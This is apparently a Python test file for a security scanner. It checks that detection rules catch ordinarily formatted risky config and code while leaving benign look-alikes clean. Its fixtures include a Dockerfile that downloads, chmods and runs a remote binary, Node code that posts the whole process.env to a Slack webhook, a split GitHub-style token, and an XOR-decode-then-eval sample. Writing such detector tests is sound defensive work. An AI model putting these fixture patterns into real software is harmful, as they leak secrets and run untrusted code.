"""Rules must survive the way people actually write config.

Every case here was written by hand as a realistic sample and missed by a rule
that claimed to cover it. None of them is an evasion: `terraform fmt` aligns
assignments, Dockerfiles continue `RUN` across backslashes, Python joins
adjacent literals with no operator, `chmod 755` is as common as `chmod +x`, and
a Node client passes host and path as separate strings.

That makes them the sharpest kind of gap. An evasion at least requires an
attacker to try; these missed the ordinary spelling, which means the rules were
passing on corpus samples that happened to be formatted the way the pattern was
written. A corpus is only evidence if it was not written to fit.
"""

from __future__ import annotations

from cordon_scanner import Scanner
from cordon_scanner.core.models import Category
from support import assemble


def flagged(root) -> set[str]:
    return {
        f.rule_id
        for f in Scanner().scan(root).findings
        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
    }


class TestAlignedAssignment:
    """`terraform fmt` aligns `=` on the longest key in the block, so the gap
    before a value is as wide as the block's widest name."""

    def test_aligned_terraform_public_ingress(self, tmp_path) -> None:
        (tmp_path / "main.tf").write_text(
            'resource "aws_security_group_rule" "open" {\n'
            '  type              = "ingress"\n'
            '  protocol          = "tcp"\n'
            '  cidr_blocks       = ["0.0.0.0/0"]\n'
            "}\n",
            encoding="utf-8",
        )
        assert "SUSPECT.IAC.PUBLIC_INGRESS.001" in flagged(tmp_path)

    def test_aligned_kubernetes_rbac_wildcard(self, tmp_path) -> None:
        (tmp_path / "role.yaml").write_text(
            "apiVersion: rbac.authorization.k8s.io/v1\n"
            "kind: ClusterRole\n"
            "metadata:\n  name: r\n"
            "rules:\n"
            '  - apiGroups:      ["*"]\n'
            '    resources:      ["*"]\n'
            '    verbs:          ["*"]\n',
            encoding="utf-8",
        )
        assert "SUSPECT.K8S.RBAC_WILDCARD.001" in flagged(tmp_path)

    def test_alignment_does_not_make_a_safe_value_unsafe(self, tmp_path) -> None:
        (tmp_path / "main.tf").write_text(
            'resource "aws_security_group_rule" "internal" {\n'
            '  type                     = "ingress"\n'
            '  cidr_blocks              = ["10.0.0.0/8"]\n'
            "}\n",
            encoding="utf-8",
        )
        assert flagged(tmp_path) == set()

    def test_the_gap_does_not_cross_a_newline(self, tmp_path) -> None:
        """Widening the bound must not let a key on one line pair with a value
        on another. Horizontal whitespace only, which is both wider and
        stricter than what it replaced."""
        (tmp_path / "main.tf").write_text(
            'variable "cidr_blocks" {\n  description = "which ranges"\n}\n'
            'output "note" {\n  value = "0.0.0.0/0 is not used here"\n}\n',
            encoding="utf-8",
        )
        assert "SUSPECT.IAC.PUBLIC_INGRESS.001" not in flagged(tmp_path)


class TestLineContinuations:
    """A Dockerfile `RUN` is written across backslash continuations as a matter
    of course, so a rule whose gap stops at the first newline misses the
    ordinary spelling rather than an evasion of it."""

    def test_fetch_then_chmod_across_continuations(self, tmp_path) -> None:
        (tmp_path / "Dockerfile").write_text(
            "FROM debian:bookworm-slim\n"
            "RUN apt-get update && apt-get install -y wget \\\n"
            " && wget -q https://cdn.example.invalid/agent -O /usr/bin/agent \\\n"
            " && chmod 755 /usr/bin/agent \\\n"
            " && /usr/bin/agent --register\n",
            encoding="utf-8",
        )
        assert "SUSPECT.CONTAINER.FETCH_EXEC.001" in flagged(tmp_path)

    def test_a_numeric_mode_counts_as_making_it_executable(self, tmp_path) -> None:
        """`chmod 755` and `chmod +x` do the same thing."""
        (tmp_path / "Dockerfile").write_text(
            "FROM alpine\nRUN curl -sSL https://x.invalid/a -o /tmp/a && chmod 700 /tmp/a\n",
            encoding="utf-8",
        )
        assert "SUSPECT.CONTAINER.FETCH_EXEC.001" in flagged(tmp_path)

    def test_an_ordinary_dockerfile_with_curl_and_chmod_stays_clean(self, tmp_path) -> None:
        """Both verbs are present and unrelated: curl is installed, and a file
        that came from COPY is made executable."""
        (tmp_path / "Dockerfile").write_text(
            "FROM python:3.12-slim\n"
            "RUN apt-get update \\\n && apt-get install -y --no-install-recommends curl \\\n"
            " && rm -rf /var/lib/apt/lists/*\n"
            "COPY scripts/entrypoint.sh /usr/local/bin/entrypoint\n"
            "RUN chmod 755 /usr/local/bin/entrypoint\n"
            "USER nobody\n",
            encoding="utf-8",
        )
        assert flagged(tmp_path) == set()


class TestImplicitConcatenation:
    """Python joins adjacent string literals with no operator at all, so the
    joined value exists for the interpreter and never appears in the file."""

    def test_a_token_split_by_adjacency(self, tmp_path) -> None:
        token = assemble("ghp_", "9wQ2rT5yU8iO1pA4sD7fG0hJ3kL6zX9cV2bN")
        (tmp_path / "conf.py").write_text(
            f'TOKEN = ("{token[:4]}" "{token[4:]}")\n', encoding="utf-8"
        )
        assert "SECRET.GITHUB.TOKEN.001" in flagged(tmp_path)

    def test_an_ordinary_long_url_constant_is_not_a_secret(self, tmp_path) -> None:
        """Reading every constant is what implicit concatenation requires, and
        the entropy heuristic must not come with it: applied to every constant
        it reports every long URL in a project. This one is a real URL from
        this project's own SARIF reporter."""
        (tmp_path / "report.py").write_text(
            "SCHEMA = (\n"
            '    "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/'
            'Schemata/sarif-schema-2.1.0.json"\n'
            ")\n",
            encoding="utf-8",
        )
        assert flagged(tmp_path) == set()

    def test_a_low_entropy_adjacency_is_not_a_secret(self, tmp_path) -> None:
        (tmp_path / "const.py").write_text('PREFIX = ("cordon" "-" "scanner")\n', encoding="utf-8")
        assert flagged(tmp_path) == set()


class TestValueShapesInOtherLanguages:
    def test_environment_copied_as_one_argument_among_several(self, tmp_path) -> None:
        """`Object.assign({}, process.env, extra)` is the ordinary way to copy
        an environment, and a pattern anchored on `process.env)` missed it."""
        (tmp_path / "index.js").write_text(
            "const https = require('https');\n"
            "const all = Object.assign({}, process.env, { at: Date.now() });\n"
            "const req = https.request({ hostname: 'hooks.slack.com', "
            "path: '/services/T/B/X', method: 'POST' });\n"
            "req.end(JSON.stringify(all));\n",
            encoding="utf-8",
        )
        assert "SUSPECT.EXFIL.DROP_POINT.001" in flagged(tmp_path)

    def test_a_notifier_that_does_not_read_the_environment_stays_clean(self, tmp_path) -> None:
        (tmp_path / "index.js").write_text(
            "const https = require('https');\n"
            "const { PORT = 3000, NODE_ENV } = process.env;\n"
            "const req = https.request({ hostname: 'hooks.slack.com', "
            "path: '/services/T/B/X', method: 'POST' });\n"
            "req.end(JSON.stringify({ text: `up on ${PORT} in ${NODE_ENV}` }));\n",
            encoding="utf-8",
        )
        assert flagged(tmp_path) == set()

    def test_xor_written_as_an_append_loop(self, tmp_path) -> None:
        """The loop form is more common in real samples than the comprehension,
        and was matched by none of the patterns."""
        (tmp_path / "boot.py").write_text(
            "KEY = 0x5A\n"
            "DATA = bytearray([0x39, 0x3f, 0x36])\n"
            "out = bytearray()\n"
            "for byte in DATA:\n    out.append(byte ^ KEY)\n"
            # Assembled: this file is scanned by the tool it tests, and the
            # decode-and-execute pair written whole is a true positive.
            + assemble("ev", "al(comp", "ile(out.decode(), '<s>', 'exec'))\n"),
            encoding="utf-8",
        )
        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)

    def test_an_ordinary_append_and_an_ordinary_xor_stay_clean(self, tmp_path) -> None:
        (tmp_path / "util.py").write_text(
            "def parity(data):\n"
            "    total = 0\n"
            "    for byte in data:\n        total ^= byte\n"
            "    return total\n\n"
            "def shift(values, key):\n"
            "    out = []\n"
            "    for v in values:\n        out.append(v + key)\n"
            "    return out\n",
            encoding="utf-8",
        )
        assert flagged(tmp_path) == set()
